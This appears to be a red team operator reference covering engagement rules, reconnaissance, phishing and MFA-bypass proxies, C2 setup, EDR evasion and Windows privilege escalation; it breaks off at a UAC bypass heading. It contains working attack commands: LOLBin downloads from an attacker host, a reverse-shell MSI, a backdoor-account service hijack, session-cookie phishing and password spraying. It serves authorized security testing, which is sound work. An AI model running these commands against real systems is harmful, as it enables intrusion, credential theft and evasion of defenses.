# Red Team Reference — Authorized Operator Field Guide

> **Authorization Notice:** This reference is intended exclusively for authorized red team operators working under signed rules of engagement (ROE) and legal authorization documents. All techniques, tools, and methodologies described herein are for use in authorized security assessments only. Unauthorized use against systems you do not have explicit written permission to test is illegal and unethical. This document serves as a methodology and tradecraft reference — not a step-by-step exploitation guide.

---

## Table of Contents

1. [Red Team Program Design & Rules of Engagement](#_1-red-team-program-design-amp-rules-of-engagement)
2. [Reconnaissance & OSINT](#_2-reconnaissance-amp-osint)
3. [Initial Access Techniques](#_3-initial-access-techniques)
4. [C2 Infrastructure & OPSEC](#_4-c2-infrastructure-amp-opsec)
5. [Payload Development & Evasion](#_5-payload-development-amp-evasion)
6. [Privilege Escalation](#_6-privilege-escalation)
7. [Lateral Movement & Credential Access](#_7-lateral-movement-amp-credential-access)
8. [Domain Dominance & Persistence](#_8-domain-dominance-amp-persistence)
9. [Reporting & Purple Team Integration](#_9-reporting-amp-purple-team-integration)
10. [Red Team Tooling Reference](#_10-red-team-tooling-reference)

---

## 1. Red Team Program Design & Rules of Engagement

### 1.1 Defining the Red Team Function

Red teaming is a structured, adversarial simulation discipline distinct from penetration testing and purple teaming. Understanding these distinctions is critical for scoping engagements, setting client expectations, and ensuring the activity delivers actionable security intelligence.

**Red Team vs. Penetration Test vs. Purple Team:**

| Dimension | Penetration Test | Red Team Engagement | Purple Team Exercise |
|---|---|---|---|
| **Objective** | Find and validate vulnerabilities | Simulate adversary achieving an objective | Jointly improve detection and response |
| **Scope** | Broad, enumerate everything | Narrow objective (reach domain admin, exfiltrate data) | Specific TTP subset |
| **Stealth** | Not typically required | Core requirement — avoid detection | Transparent, collaborative |
| **Duration** | 1-3 weeks typical | 4-12+ weeks | 1-5 days per sprint |
| **Blue Team Awareness** | Typically informed | Blind (no-notice) or deconflicted only | Fully collaborative |
| **Deliverable** | Vulnerability report | Attack narrative + detection gap analysis | Detection improvement report |
| **Engagement Driver** | Compliance, audit | Threat-informed resilience | SIEM/EDR tuning, blue team maturity |

A red team engagement is not a compliance exercise. It is an adversarial simulation designed to answer the question: "Could a real-world threat actor with defined capabilities achieve a specific objective against our organization, and would we detect them?"

### 1.2 Engagement Types

**Full Adversary Simulation:** Operator teams simulate a specific threat actor (APT group, cybercriminal syndicate) using TTPs sourced from threat intelligence. Often runs 8-16 weeks. Objectives may include data exfiltration, financial system access, OT/ICS network access, or supply chain compromise simulation.

**Assumed Breach:** The red team begins with a foothold already established (pre-positioned implant, valid credentials, domain-joined laptop). Tests internal detection, lateral movement defenses, and response capability. Useful when initial access has already been validated or when time is limited.

**Purple Team Exercise:** Structured collaboration where red and blue work together. Red team executes a TTP, blue team attempts detection, both teams immediately discuss gaps and tune detections. VECTR or similar platforms track coverage. More training exercise than true adversarial simulation.

**Tabletop Exercise:** No active technical execution. Stakeholders (CISO, IR lead, legal, communications) walk through a scenario narrative and evaluate response procedures. Identifies process and communication gaps. Often a precursor to technical exercises.

**Physical Red Team:** Operators attempt unauthorized physical access to facilities, data centers, or sensitive areas. Techniques include tailgating, social engineering receptionists, badge cloning, lockpicking, and dumpster diving. Requires extremely specific scope and emergency contacts.

**Hybrid / Compound:** Most enterprise engagements combine elements — external initial access attempt, assumed breach if initial access fails, and physical component. Structure depends on maturity and objectives.

### 1.3 Scoping Document Components

The scope document is a legally binding specification of what is and is not permitted. It must be reviewed by legal counsel and signed by an authorized representative of the asset owner before any testing begins.

**In-Scope Definition (be explicit, not implicit):**
- IP ranges: CIDR notation (10.0.0.0/8, 192.168.1.0/24), with explicit note of any subnets within that range that are excluded
- Domains and subdomains: *.target.com, specific subdomains (mail.target.com, vpn.target.com)
- Cloud accounts: AWS account IDs, Azure subscription IDs, GCP project IDs
- Applications: named applications with version identifiers where relevant
- Physical locations: building addresses, floor numbers, badge access zones
- Personnel targeting: whether phishing/vishing of employees is authorized, which employee groups

**Out-of-Scope Systems (explicit exclusion list):**
- Production databases containing regulated data (PII, PHI, PCI)
- Healthcare systems, patient portals, life-safety systems
- Third-party vendor infrastructure not explicitly included
- Systems owned by subsidiaries or partners unless separately authorized
- Cloud-shared infrastructure (hypervisor layer, CSP control planes)

**Prohibited Actions (enumerate clearly):**
- Modification or deletion of production data
- Deployment of actual ransomware (encryptors) — use benign simulators only
- Denial of service or service disruption actions
- Exploitation of vulnerabilities in out-of-scope systems even if discovered
- Social engineering of executive leadership without explicit named authorization
- Contacting law enforcement, media, or external parties as part of a pretext without approval
- Physical actions that could endanger personnel

### 1.4 Emergency Contact & Deconfliction Procedures

Every engagement must have a documented emergency stop procedure. Operators must know when and how to halt testing immediately.

**Get-Out-of-Jail (GOOJ) Letter:** Operators carry a physical and digital copy of an authorization letter signed by an authorized representative of the target organization. The letter identifies the operator, engagement dates, authorizing official contact information, and a statement of authorization. If operators are detained by law enforcement or physical security, they present this letter and request contact be made with the named authorizing official.

**Emergency Stop Triggers:**
- Discovery that an actual threat actor is present on the network (indicators of real compromise)
- Accidental access to out-of-scope systems containing sensitive regulated data
- Physical safety concern involving personnel
- Significant unintended service disruption
- Legal notice or law enforcement contact

**Deconfliction Channel:** Establish a dedicated secure communication channel (Signal group, encrypted email alias) with a designated client-side security contact who is aware of the engagement. This contact should be available 24/7 during active testing phases and has authority to immediately halt the engagement.

**SOC Deconfliction:** Decide whether the SOC is informed of the engagement (semi-transparent) or blind (full opacity). Document which specific SOC personnel are "read in" (typically the CISO and SOC lead). Establish an out-of-band confirmation code that operators can use if contacted by a SOC analyst during testing.

### 1.5 ROE Document Structure

A well-structured ROE document typically contains:

1. **Legal Authorization Letter** — signed by asset owner's authorized representative, identifying engagement scope, dates, and operator names/companies
2. **Scope Definition** — in-scope and out-of-scope assets as described above
3. **Engagement Objectives** — specific adversary objectives (flags/targets) the red team will attempt to achieve
4. **Rules of Engagement Matrix** — table of techniques and whether each is authorized
5. **Communication Plan** — authorized contacts, deconfliction channel details, escalation path (operator to team lead to client POC to CISO)
6. **Reporting Requirements** — interim reporting cadence, final report format, handling requirements for sensitive findings
7. **Operator Safety Procedures** — GOOJ letter template, emergency stop protocol, legal counsel contact on retainer
8. **Data Handling** — how captured credentials, data samples, and evidence are stored, retained, and destroyed post-engagement

### 1.6 Regulatory Frameworks for Red Teaming

**TIBER-EU (Threat Intelligence-Based Ethical Red Teaming):** Developed by the European Central Bank for EU financial sector entities. Three phases: Preparation (scope, engagement rules), Threat Intelligence (targeted intelligence report on likely TTPs against that entity), Red Team Test (adversary simulation guided by TI report). Requires an accredited threat intelligence provider and red team provider. Results shared with national competent authorities. Mutual recognition agreements allow results to be accepted across jurisdictions.

**CBEST (UK):** Framework developed by the UK Financial Conduct Authority (FCA) and Bank of England (BoE) for UK systemically important financial institutions. Similar structure to TIBER-EU — intelligence-led, threat-actor simulation. Requires Council of Registered Ethical Security Testers (CREST) accreditation for providers. Results reported to the PRA/FCA.

**iCAST (Hong Kong):** Intelligence-led Cyber Attack Simulation Testing framework from the Hong Kong Monetary Authority (HKMA). Applies to authorized institutions in Hong Kong. Follows TI-led red team methodology with HKMA oversight.

**DORA TLPT (EU Digital Operational Resilience Act):** The Digital Operational Resilience Act requires Threat-Led Penetration Testing (TLPT) for significant financial entities operating in the EU. Builds on TIBER-EU methodology. Entities must conduct TLPT at least every 3 years. Tests must cover live production systems. Results shared with competent authorities.

**Red Team Maturity Model (informal):**
- **Level 1 — Ad Hoc:** Occasional penetration tests, no structured red team function
- **Level 2 — Developing:** Defined red team program, basic ROE, annual assessments
- **Level 3 — Defined:** Threat-informed assessments, MITRE ATT&CK mapped, purple team integration beginning
- **Level 4 — Managed:** Continuous red team activity, BAS tools supplement manual testing, VECTR tracking, metrics-driven
- **Level 5 — Optimized:** Intelligence-led adversary simulation, TIBER/CBEST-style engagements, automated detection validation, continuous improvement loop

---

## 2. Reconnaissance & OSINT

### 2.1 Passive Reconnaissance Philosophy

Passive reconnaissance involves gathering intelligence about a target using only publicly available sources, without sending any packets to the target's infrastructure. The goal is to build a comprehensive picture of the attack surface before conducting any active testing that could be logged by the target.

**Intelligence Categories to Develop:**
- External network perimeter (IP ranges, ASNs, exposed services)
- Domain and subdomain inventory
- Technology stack (web servers, frameworks, cloud providers, security products)
- Organizational structure (employee names, roles, reporting lines)
- Third-party relationships (suppliers, cloud providers, managed service providers)
- Historical exposure (past breaches, leaked credentials, exposed code repositories)

### 2.2 Network & Infrastructure Intelligence

**Shodan:** The primary search engine for internet-connected devices. Key query syntax:

```
ssl.cert.subject.CN:"target.com"        # Find all certs issued to target domain
org:"Target Corporation"                 # Assets by organization name
net:203.0.113.0/24                      # Assets in specific IP range
port:3389 org:"Target"                  # RDP exposed for target org
vuln:CVE-2021-44228                     # Log4Shell vulnerable hosts
product:"Pulse Secure"                  # Specific product/VPN type
```

**Censys:** Certificate-centric internet scanning platform:

```
certificates.parsed.names: target.com
services.http.response.html_title: "Target"
services.tls.certificate.parsed.subject_dn: "O=Target Corporation"
autonomous_system.organization: "Target Corporation"
```

**FOFA (China-based alternative):** `domain="target.com"` and `cert="target.com"` queries. Particularly useful for assets in APAC regions that Shodan/Censys may index less comprehensively.

**ASN Enumeration:** Find all IP ranges owned by a target organization.
- bgp.he.net: Search by organization name to find ASN numbers
- Robtex: Reverse lookup of IP ownership and ASN
- `whois -h whois.radb.net -- '-i origin AS12345'` finds all prefixes originated by an ASN
- ipinfo.io API: programmatic ASN-to-prefix lookup

### 2.3 DNS & Subdomain Enumeration

**Certificate Transparency Logs:** All publicly trusted TLS certificates are logged to CT logs, creating a searchable history of subdomains.

```bash
# crt.sh command-line with jq parsing
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u
```

**Active DNS Enumeration Tools:**

```bash
# Amass
amass enum -passive -d target.com
amass enum -active -brute -d target.com -r 8.8.8.8

# Subfinder
subfinder -d target.com -all -o subdomains.txt

# dnsx — DNS resolution and validation
dnsx -l subdomains.txt -a -resp -o resolved.txt
dnsx -l subdomains.txt -cname -resp    # Find CNAMEs (subdomain takeover candidates)

# Massdns — high-performance bulk DNS resolution
massdns -r resolvers.txt -t A -o S subdomains.txt -w results.txt

# Gobuster DNS mode
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

**Subdomain Takeover:** After enumeration, check CNAMEs pointing to unclaimed third-party services (GitHub Pages, Heroku, Fastly, Azure, AWS S3). Tools: subjack, nuclei with takeover templates.

### 2.4 GitHub & Code Repository Intelligence

Exposed secrets in public code repositories represent one of the highest-value passive reconnaissance findings.

**GitHub Dorking Patterns:**

```
org:targetorg filename:.env
org:targetorg password
org:targetorg AWS_ACCESS_KEY
org:targetorg PRIVATE_KEY
org:targetorg "BEGIN RSA PRIVATE KEY"
org:targetorg jdbc:postgresql
org:targetorg "mongodb://"
org:targetorg filename:credentials.json
org:targetorg filename:config.yml password
```

**Automated Tools:**

```bash
trufflehog github --org=targetorg
gitleaks detect --source=cloned-repo-path
```

### 2.5 Email Harvesting & Organizational Intelligence

**Email Format Discovery:**
- theHarvester: `theHarvester -d target.com -b all -l 500`
- hunter.io (web API): provides email format patterns and validates employee emails
- LinkedIn: profile names cross-referenced with discovered format

**LinkedIn Organizational Intelligence:**
- Map org chart by browsing employee profiles and inferring reporting relationships from titles
- Identify recently departed employees whose credentials may still be valid
- Job postings reveal technology stack: "Experience with Splunk SIEM" identifies the SIEM platform; "Must know CrowdStrike Falcon" identifies the EDR

**Maltego:** Visual link analysis tool with transforms for passive OSINT correlation. Useful for domain-to-IP-to-ASN-to-organization pivoting and email-to-person-to-LinkedIn correlation.

### 2.6 Active Reconnaissance

Active reconnaissance involves directly querying target infrastructure. It will appear in logs and may trigger IDS/IPS alerts. Should be conducted from engagement infrastructure only.

```bash
# Nmap comprehensive scan
nmap -sV -sC -O -p- --script vuln target.com -oA nmap_full

# Nmap common ports
nmap -sV -sC --top-ports 1000 -T3 10.0.0.0/24 -oA nmap_quick

# Masscan for large ranges
masscan -p1-65535 --rate=10000 10.0.0.0/8 -oL masscan_results.txt
masscan -p80,443,8080,8443 --rate=50000 203.0.113.0/24

# Web application fingerprinting
wafw00f https://target.com
whatweb -a 3 https://target.com
nuclei -u target.com -t technologies/
nuclei -u target.com -t cves/ -severity critical,high
```

**OSINT Framework Categories (osintframework.com):**
Username, Email, Domain, IP, Networks, Social Networks, Instant Messaging, People Search, Telephone, Business, Social Media, Images/Videos, Documents, Forums, Dark Web, Geolocation, Search Engines, Archives, Metadata, Mobile, Password, Code, Threats

---

## 3. Initial Access Techniques

### 3.1 Phishing Campaign Methodology

Email phishing remains the highest-yield initial access vector across most enterprise environments. A professional red team phishing campaign involves careful infrastructure setup, content development, and execution with campaign tracking.

**GoPhish Campaign Setup:**

GoPhish is an open-source phishing framework that manages the full campaign lifecycle.

```
1. SMTP Profile configuration:
   - Use engagement-purchased domain with configured SPF/DKIM/DMARC records
   - SMTP relay: AWS SES, SendGrid, or self-hosted Postfix
   - Test deliverability with mail-tester.com before campaign launch

2. Email Template construction:
   - Match sender display name and From address to impersonated entity
   - Clone legitimate email from target org (password reset, IT notification, DocuSign)
   - Remove X-Mailer headers that reveal the MTA
   - Embed tracking pixel for open tracking
   - Link to GoPhish landing page using the URL template variable

3. Landing Page:
   - Clone target SSO portal or credential submission page
   - Capture submitted credentials for reporting (never for unauthorized use)
   - Redirect to legitimate site post-submission

4. Target Group:
   - Import CSV of target email addresses
   - Segment by department for spear phishing variants

5. Campaign Launch:
   - Stagger send times to avoid bulk mail detection
   - Monitor dashboard for opens, link clicks, credential submissions
```

**Phishing Content OPSEC:**
- Use a domain registered at least 60 days before campaign (older domains have better reputation)
- Match domain naming convention to target (targetcorp-helpdesk.com, not randomletters.xyz)
- Never use free email providers (Gmail, Hotmail) as sending domain
- Remove metadata from any attached documents (exiftool -all= document.docx)

### 3.2 MFA Bypass Techniques

Modern phishing must account for multi-factor authentication. Several techniques exist to bypass common MFA implementations.

**Adversary-in-the-Middle (AiTM) Proxies:**

EvilGinx3 operates as a reverse proxy that sits between the victim and the legitimate service, allowing real-time capture of session tokens after MFA completion.

```bash
# EvilGinx3 basic workflow
evilginx -p ./phishlets/

# Configure phishlet
config domain evil-operator.com
config ip YOUR_SERVER_IP
phishlets hostname microsoft365 login.microsoftonline.evil-operator.com
phishlets enable microsoft365

# Create lure URL for campaign
lures create microsoft365
lures get-url 0

# After victim authenticates, retrieve captured session
sessions
# Import captured session cookie via browser extension (Cookie-Editor)
```

Modlishka is an alternative AiTM proxy with similar capabilities and a different configuration model.

**MFA Push Fatigue (T1621):**
Send rapid successive MFA push notifications to a victim's authenticator app. Goal is to overwhelm the user into approving one request. Most effective when combined with a vishing call impersonating IT support explaining a system issue.

**Browser-in-the-Browser (BitB):**
Render a fake browser popup window within a web page that mimics an OAuth consent dialog. The fake window appears to be a legitimate popup from accounts.google.com or login.microsoftonline.com but is entirely rendered within the attacker's page.

**QR Code Phishing (Quishing):**
Embed malicious URL in a QR code image rather than a hyperlink. Email URL scanners that rewrite/scan links do not process QR code images. Mobile devices scanning the QR code may have fewer security controls than corporate endpoints.

### 3.3 Voice Phishing (Vishing)

Vishing is often the fastest path to initial access in organizations with strong email filtering but weaker phone-based verification processes.

**Help Desk Bypass Pretexting:**
Operator calls help desk impersonating an executive or employee. Common approaches:
- Impersonate an executive's assistant in a time-pressured situation (international travel, board meeting)
- Impersonate an on-site technician with a badge access issue
- Impersonate a user who received a security alert about their compromised account

**Identity Verification Bypass:** Most help desks use weak identity verification (employee ID, manager name) — all obtainable via LinkedIn OSINT. Identify verification mechanisms during reconnaissance to adapt the pretext.

### 3.4 Physical Access Techniques

**Tailgating/Piggybacking:** Following an authorized person through a badge-controlled door without using a badge. Social engineering variant: carry a large box or appear as a delivery person.

**RFID Badge Cloning:**
- Proxmark3: Professional RFID research and cloning tool. Reads HID Prox (125kHz), iClass (13.56MHz), and many other formats.
- Flipper Zero: Consumer multi-tool supporting 125kHz LF RFID (HID Prox, EM4100), NFC (MIFARE Classic, DESFire). More portable and inconspicuous than Proxmark3.
- Modern access control systems using encrypted credentials (MIFARE DESFire EV1/EV2, iCLASS SE) cannot be cloned without the encryption keys. Reconnaissance should determine badge technology before committing to cloning attacks.

**USB Drop Payloads:**
- Hak5 Rubber Ducky: Emulates a USB HID keyboard. Executes pre-programmed DuckyScript sequences at typing speeds that bypass behavioral detection.
- O.MG Cable: Appears as a legitimate charging or data cable. Contains a hidden Wi-Fi-accessible implant that executes HID attacks on command.

### 3.5 Technical Initial Access

**Password Spraying with IP Rotation:**

```bash
# Fireprox — creates AWS API Gateway proxy to rotate source IPs
python3 fireprox.py --access_key AKID --secret_access_key SECRET \
  --region us-east-1 --command create --url https://login.microsoftonline.com

# MSOLSpray — Microsoft 365 password spray
Invoke-MSOLSpray -UserList users.txt -Password "Winter2024!" \
  -URL https://API_ID.execute-api.us-east-1.amazonaws.com/fireprox/

# Kerbrute — Kerberos pre-auth based user enumeration and password spray
kerbrute passwordspray -d corp.local users.txt "Winter2024!" --dc 10.0.0.1
```

**Common Password Spray Patterns:**
- Season+Year: Winter2024!, Spring2025
- Company name variants: Company1, Company123!
- Welcome variations: Welcome1!, Welcome@123
- Spray timing: one attempt per user per 30 minutes to avoid lockout

---

## 4. C2 Infrastructure & OPSEC

### 4.1 C2 Framework Overview

Command and Control (C2) infrastructure is the backbone of a red team engagement, enabling operator control of deployed implants. Framework selection depends on engagement requirements, target environment, and budget.

**Framework Comparison:**

| Framework | Type | Cost | Key Features | Best For |
|---|---|---|---|---|
| Cobalt Strike | Commercial | ~$3,500/yr/operator | Malleable C2, BOF, Team Server, mature ecosystem | Enterprise assessments, mature red teams |
| Sliver | Open Source | Free | mTLS/WireGuard/HTTP/DNS transports, multi-operator, BOF support | Budget-conscious engagements, open ecosystem |
| Havoc | Open Source | Free | Demon agent, extC2, modern evasion, active development | Teams avoiding licensing costs |
| Brute Ratel C4 | Commercial | ~$2,500/yr | EDR-focused evasion, Badger agent, process injection focus | Heavily defended environments |
| Mythic | Open Source | Free | Agent/C2 profile modularity, web UI, extensive plugin ecosystem | Custom implant development |
| Metasploit | Open Source | Free (Pro available) | Broad exploit library, meterpreter, well-understood | Initial access, less OPSEC-sensitive phases |

**Cobalt Strike Key Capabilities:**
- Malleable C2 Profiles: Define how beacon network traffic looks (HTTP headers, URIs, jitter timing) to blend with legitimate application traffic. Custom profiles should be developed for mature engagements.
- Beacon Object Files (BOFs): Small compiled C programs that execute within the beacon process, avoiding new process creation. Reduces EDR telemetry compared to fork-and-run.
- Team Server: Multi-operator server where beacons check in and operators share sessions.

**Sliver Implant Generation:**

```bash
# Generate an HTTP implant
sliver > generate --http https://c2.example.com --os windows --arch amd64 --name IMPLANT_NAME

# Generate with multiple C2 channels (fallback)
sliver > generate --http https://primary.example.com --http https://backup.example.com \
  --os windows --arch amd64

# Generate with DNS C2
sliver > generate --dns c2.example.com --os linux --arch amd64

# Start HTTP listener
sliver > http --domain c2.example.com --lhost 0.0.0.0 --lport 443
```

### 4.2 Multi-Tier Infrastructure Design

Professional red team infrastructure uses multiple layers to protect the team server from discovery and attribution.

**Three-Tier Architecture:**

```
[Implant on victim] --> [Redirector Tier 1: CDN/Domain Fronting] -->
[Redirector Tier 2: Apache/Nginx mod_rewrite] --> [Team Server]
```

**Apache mod_rewrite Redirector Configuration:**

```apache
RewriteEngine On

# Block common security scanner user-agents
RewriteCond %{HTTP_USER_AGENT} "curl|wget|python-requests|masscan|nmap|nikto|zgrab" [NC]
RewriteRule .* https://www.google.com/ [L,R=302]

# Block requests missing expected custom header
RewriteCond %{HTTP:X-Custom-Header} !^ExpectedValue$ [NC]
RewriteRule .* https://www.google.com/ [L,R=302]

# Forward legitimate beacon traffic to team server
RewriteRule ^/path/(.*)$ https://TEAM_SERVER_IP:4443/$1 [L,P]
```

**Domain Selection Criteria:**
- Aged domains (purchased 6+ months prior) with established web reputation categories (news, technology, shopping — avoid "uncategorized")
- Domains that plausibly relate to legitimate business services
- Valid TLS certificates from trusted CAs (Let's Encrypt)
- Configured rDNS records
- Separate domains per implant type (HTTP beacon vs. DNS C2 vs. HTTPS exfil)

**DNS-Based C2:** For environments with highly restrictive egress filtering (only port 53 allowed outbound), DNS C2 tunnels data through DNS TXT/A/CNAME record queries. Extremely slow but effective when HTTP/HTTPS is blocked. Sliver, Cobalt Strike, and DNScat2 all support DNS C2.

### 4.3 Operational Security (OPSEC) Checklist

OPSEC failures expose the red team's identity, tactics, and infrastructure — potentially alerting the real adversary the exercise is meant to simulate, or causing legal complications.

**Infrastructure OPSEC:**
- [ ] All team server access routes through VPN (Mullvad or similar no-log provider) before connecting to offshore VPS
- [ ] Team server is not directly exposed — all access through redirector tier
- [ ] Each engagement uses unique, newly provisioned infrastructure (no reuse across clients)
- [ ] Domain registration uses privacy protection and privacy-preserving payment
- [ ] TLS certificates from public CA — avoid self-signed on external-facing infrastructure
- [ ] Redirector logs are sanitized or disabled
- [ ] Team server firewall allows inbound only from redirector IPs

**Implant OPSEC:**
- [ ] Unique implant configuration per operator, per target host (different sleep times, jitter, unique identifiers)
- [ ] Metadata stripped from all payload files (exiftool -all= payload.exe)
- [ ] No debugging symbols, PDB paths, or developer usernames in compiled implants
- [ ] Timestomping applied post-deployment where appropriate
- [ ] Beacon sleep time set to realistic interval (5-15 minutes typical for long-running campaigns)
- [ ] C2 traffic profile matches observed legitimate traffic on target network

**Operator OPSEC:**
- [ ] Operator personal devices not used for engagement activities
- [ ] Personal accounts (email, social) not accessed from engagement VPN/VPS
- [ ] Signal or encrypted channel used for operator coordination (not SMS or personal Slack)
- [ ] Engagement notes stored in encrypted volume (VeraCrypt or similar)
- [ ] No screenshots of victim systems on personal cloud sync (iCloud, Google Photos, OneDrive)
- [ ] Clean browser profile used for target reconnaissance (no personal logins in browser)

---

## 5. Payload Development & Evasion

### 5.1 Evasion Landscape Overview

Modern endpoint detection and response (EDR) solutions monitor for:
- Static signatures (file hash, string patterns, YARA rules)
- Dynamic behavioral analysis (API call sequences, memory patterns)
- ETW (Event Tracing for Windows) telemetry
- AMSI (Antimalware Scan Interface) interception of script content
- Network traffic patterns (C2 communication signatures)
- Parent-child process relationships and anomalous process creation

Effective payload development requires addressing each of these detection surfaces.

### 5.2 Process Injection Techniques

**DLL Sideloading (T1574.002):**
Many legitimate Windows applications attempt to load DLLs from the application directory before the System32 path. If the application directory is writable and a required DLL does not exist there, an attacker can place a malicious DLL.

```
Discovery process using Procmon (Sysinternals):
Filter: Operation = CreateFile, Path ends with .dll, Result = NAME NOT FOUND
Look for auto-start applications or scheduled tasks that load DLLs from writable paths
```

**Process Hollowing (T1055.012):**
Create a legitimate process in suspended state, unmap its memory, write shellcode/PE into the now-empty address space, adjust entry point, resume execution. The process appears legitimate in process listings. EDRs detect via memory scanning — executable regions with no backing file-on-disk are suspicious.

**Reflective DLL Injection (T1055.001):**
A DLL that contains its own loader capable of loading itself from memory without requiring the Windows loader. The DLL resolves its own imports and relocates itself. Avoids writing DLL to disk. Implementation: ReflectiveDLLInjection (by Stephen Fewer), or modern variants with additional OPSEC features.

**Shellcode Execution via Callback Functions:**
Execute shellcode by passing it as a callback to a Windows API function. The operating system invokes the callback, bypassing some hook-based detection that monitors CreateThread directly.

```c
// Callback-based execution pattern
// Useful callback APIs:
// EnumDesktopsW, EnumSystemLocalesA, EnumUILanguagesA, EnumCalendarInfoA
// CreateTimerQueueTimer, SetTimer (WndProc callback), EnumThreadWindows
```

**Direct Syscalls (SysWhispers3):**
EDR user-mode hooks are placed on ntdll.dll exports (NtOpenProcess, NtAllocateVirtualMemory, etc.). Direct syscalls bypass these hooks by issuing the syscall instruction with the correct syscall number directly, without going through the hooked ntdll function. SysWhispers3 generates assembly stubs that determine the correct syscall number at runtime to handle different Windows versions.

### 5.3 AMSI Bypass Techniques

The Antimalware Scan Interface (AMSI) intercepts PowerShell, JScript, VBScript, and other script content before execution and passes it to the registered AV provider for scanning.

**Memory Patching:** Patching the AmsiScanBuffer function in amsi.dll loaded in the PowerShell process to always return AMSI_RESULT_CLEAN is a well-known bypass. Exact patch bytes vary by Windows version. EDR solutions increasingly monitor for attempts to modify amsi.dll in memory.

**PowerShell Obfuscation:**
Invoke-Obfuscation and similar tools transform PowerShell scripts through token substitution, string concatenation, encoding, and reordering to defeat string-based signatures. String concatenation prevents static matching of complete bypass strings.

**AMSI Provider Unloading:** COM-based approach to unload the registered AMSI provider from the current process. Requires finding and releasing the COM object reference to the AMSI provider interface.

### 5.4 ETW Patching

Event Tracing for Windows (ETW) is used by EDR solutions to receive telemetry about process activity. Patching ETW functions prevents this telemetry from being generated.

Primary targets are NtTraceEvent and EtwEventWrite. Patching approach: overwrite the first bytes of the function with a RET instruction (0xC3) or a NOP sled followed by RET. EDR solutions monitor for attempts to patch these functions — combining ETW patching with process injection into a trusted process reduces this detection surface.

### 5.5 Living off the Land Binaries (LOLBins) — T1218

Windows provides many signed Microsoft binaries that can be abused to execute arbitrary code or download files, bypassing application whitelisting.

```cmd
# Rundll32 — execute DLL export function
rundll32.exe malicious.dll,EntryPoint

# Regsvr32 — remote scriptlet execution (Squiblydoo — T1218.010)
regsvr32.exe /s /i:http://attacker.com/payload.sct scrobj.dll

# Mshta — HTA file execution
mshta.exe http://attacker.com/payload.hta

# Certutil — download and decode (T1140)
certutil.exe -urlcache -split -f http://attacker.com/payload.b64 payload.b64
certutil.exe -decode payload.b64 payload.exe

# BITSAdmin — background file transfer (T1197)
bitsadmin /transfer job http://attacker.com/payload.exe C:\Users\Public\payload.exe

# Wscript/Cscript — execute JS/VBS
wscript.exe payload.js
cscript.exe //nologo payload.vbs
```

**LOLBins reference resources:** lolbas-project.github.io (Windows binaries), gtfobins.github.io (Linux equivalents).

### 5.6 Compiler & Language Evasion

Static signature detection is language and compiler-specific. Using non-standard languages for implant development reduces signature coverage.

**Nim:** Systems language compiling to native code with Python-like syntax. Very low initial AV detection rates. WinAPI access via the winim library. Shellcode loaders in Nim have been effective against many EDRs.

**Go with Garble:** Garble (`-seed=random`) obfuscates Go binaries by renaming identifiers, removing debug symbols, and encrypting string literals. Produces binaries with low static detection.

**Rust:** Memory-safe systems language. Shellcode loaders written in Rust have low initial detection due to unusual PE structure and RTTI layout unfamiliar to AV engines.

**PE-to-Shellcode Conversion:**

```bash
# donut converts PE/DLL/.NET to position-independent shellcode
donut -a x64 -f 1 -i implant.exe -o shellcode.bin
# -a: architecture (2=x64, 1=x86)
# -f: format (1=raw, 2=base64, 3=c, 4=ruby, 5=python, 6=hex, 7=uuid, 8=golang, 9=rust)
```

**Sleep Obfuscation (Ekko Technique):**
While the beacon is sleeping, encrypt all beacon memory using Windows Cryptographic APIs via a ROP chain executed in a timer callback. Memory is decrypted just before execution resumes. Defenders scanning process memory during the sleep period see only encrypted data, not shellcode or recognizable strings.

---

## 6. Privilege Escalation

### 6.1 Windows Privilege Escalation Methodology

Privilege escalation on Windows involves transitioning from a low-privileged user context to SYSTEM, local administrator, or a domain-privileged account. Systematic enumeration is the foundation.

**Automated Enumeration Tools:**
- WinPEAS (winPEASany.exe): Comprehensive Windows privilege escalation enumeration script
- PowerUp.ps1 (PowerSploit): PowerShell-based privilege escalation checks
- Seatbelt: C# tool for situational awareness and security configuration enumeration
- AccessChk (Sysinternals): Legitimate Microsoft tool for permission enumeration

### 6.2 Service-Based Escalation

**Unquoted Service Paths (T1574.009):**
When a service path contains spaces and is not quoted, Windows tries to execute each space-delimited word as a potential executable path.

```cmd
# Enumerate services with unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"

# Example: C:\Program Files\Some Service\service.exe (unquoted)
# Windows tries: C:\Program.exe, C:\Program Files\Some.exe, then the full path
# Place malicious binary at a path where write access exists
```

**Weak Service ACLs (T1574.010):**

```cmd
# Find services writable by Authenticated Users or current user
AccessChk64.exe -uwcqv "Authenticated Users" *
AccessChk64.exe -uwcqv "BUILTIN\Users" *

# If SERVICE_CHANGE_CONFIG permission found on a service running as SYSTEM:
sc config VulnerableService binpath= "cmd.exe /c net user backdoor Pass123! /add"
sc start VulnerableService
```

**AlwaysInstallElevated (T1548.002):**

```cmd
# Check registry keys
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both return 0x1, create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi -o payload.msi
msiexec /quiet /qn /i payload.msi
```

### 6.3 Token Impersonation

Windows implements a token-based security model. Processes that hold SeImpersonatePrivilege (IIS, SQL Server service accounts, network service) can impersonate other logged-in users, including SYSTEM.

**Potato Family Attacks:**
All exploit SeImpersonatePrivilege via different Windows authentication coercion primitives:

| Tool | Technique | Requirements |
|---|---|---|
| Hot Potato | NBNS spoofing + NTLM relay | Older Windows versions |
| Rotten Potato | DCOM/RPC NTLM relay to SYSTEM | Windows 7/2008 era |
| Juicy Potato | COM object NTLM relay | Windows < 10/2019, needs specific CLSID |
| PrintSpoofer | Named pipe impersonation via Print Spooler | Windows 10/2016/2019 with SpoolSv running |
| GodPotato | RPC-based coercion, broad compatibility | Windows 2012-2022 |

```cmd
PrintSpoofer64.exe -i -c cmd.exe
GodPotato.exe -cmd "cmd /c whoami"
```

### 6.4 UAC Bypass Techniques

User Account Control (UAC) prevents standard admin accounts from performing elevated actions without a consent prompt. Several bypasses auto-elevate without triggering the prompt.

**CMSTPLUA COM Object (UACME Method #41):**
The CMSTPLUA COM interface is configured to auto-elevate. Instantiate it and use it to execute arbitrary code with elevated privileges.

**Eventvwr.exe Registry Hijack:**
